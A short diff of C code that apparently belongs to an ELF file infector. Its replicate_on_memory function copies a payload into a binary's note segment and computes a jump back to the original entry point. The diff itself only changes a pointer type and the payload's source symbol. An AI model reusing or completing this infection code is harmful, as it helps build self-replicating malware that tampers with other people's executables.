@@ -30,11 +30,11 @@ static void write_on_memory(const struct s_info *info, char *ptr)
 static void replicate_on_memory(const struct s_info *info, char *ptr)
 {
 	char *dst;
-	uint8_t *src;
+	unsigned char *src;
 	const Elf64_Addr entry_point = info->old_entry - (info->new_entry) - JMP_OFFSET;
 
 	dst = ptr + info->note->p_offset;
-	src = (uint8_t *)&constructor;
+	src = (unsigned char *)&__entry;
 
 	for (size_t index = 0; index < PAYLOAD_SIZE; index++)
 		*dst++ = *src++;
